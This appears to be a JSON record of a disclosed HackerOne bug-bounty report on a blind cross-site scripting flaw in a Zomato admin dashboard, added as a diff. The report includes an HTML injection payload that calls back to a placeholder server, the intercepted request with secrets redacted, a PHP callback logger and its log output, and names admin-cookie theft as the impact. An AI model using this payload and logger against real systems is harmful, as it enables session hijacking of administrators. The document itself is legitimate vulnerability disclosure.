@@ -1,0 +1,136 @@
+{
+  "id": 461272,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjEyNzI=",
+  "url": "https://hackerone.com/reports/461272",
+  "title": "[www.zomato.com] Blind XSS in one of the admin dashboard",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-12-12T14:17:59.211Z",
+  "submitted_at": "2018-12-12T14:17:59.211Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nguyenlv7",
+    "url": "/nguyenlv7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/128/163/b1b8a0b050c57445967d7aba4e2476e9f5b145ec_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2943,
+    "url": "https://hackerone.com/eternal",
+    "handle": "eternal",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/9525xdsq4bz7ubnoie172ssjv8ul/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Eternal",
+      "twitter_handle": "Zomato",
+      "website": "https://www.eternal.com",
+      "about": "Eternal is India’s largest new-age tech company by market cap, comprising of 4 businesses (as of now) – Zomato, Blinkit, District, & Hyperpure."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-05-01T07:05:15.495Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-12-17T07:00:26.866Z",
+  "team_member_agreed_on_going_public_at": "2019-05-01T07:05:15.409Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nAdmin dasboard ████ from user has XSS Vul\n\n## Steps To Reproduce:\n  1. Login ██████\n  1. Go to ███ function and intercept request\nPost data: \"><img src=\"http://<my_server_ip>/zomato.php?c=zomato_xss\" />\n\n```\nPOST ████ HTTP/1.1\nX-Zomato-App-Version-Code: 5610001\n██████████\n███████\nX-Zomato-API-Key: ███████\nX-App-Language: &lang=en&android_language=en&android_country=VN\nX-Zomato-App-Version: 561\nX-Network-Type: wifi\nX-Present-Long: ███████\nX-Zomato-UUID: ████████\nX-O2-City-Id: 35\nUser-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering\nX-Access-Token: █████\nX-Device-Pixel-Ratio: 1.5\nX-City-Id: 35\nX-Device-Width: 720\nContent-Type: application/x-www-form-urlencoded\nAkamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;\nX-Client-Id: zomato_android_v2\nX-Present-Lat: ██████\n██████\nX-Device-Height: 1280\nContent-Length: 156\nHost: api.zomato.com\nConnection: close\n\n█████=\"><img+src%3d\"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss\"+/>█████████\n```\n\n 1.  File **zomato.php** on my server:\n\n```\n<?php\n$time = date('Y-m-d H:i:s', time());\n$refer = $_SERVER['HTTP_REFERER'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$c = isset($_GET['c']) ? $_GET['c']: '0';\nfile_put_contents(\"log.txt\",\"Time: \". $time .\"IP: \". $ip.\" Referer: \".$refer. \"C: \". $c . \"\\n\", FILE_APPEND);\n?>\n```\n 1. XSS triggered when Admin viewed the ███████.\n\n 1. Result in file **log.txt** time UTC\n\n```\nTime: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss\nTime: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss\n```\n\nI captured 2 ip from India.\nPlease verify for me.\n\n## Impact\n\n* Steal admin cookies.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 101,
+  "voters": [
+    "0xtarun",
+    "61u36100d",
+    "badf00d",
+    "ajinkyadeokar7",
+    "vavkamil",
+    "base_64",
+    "kickino",
+    "tess",
+    "s1r1u5",
+    "sameerphad72",
+    "and 91 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 383,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.zomato.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
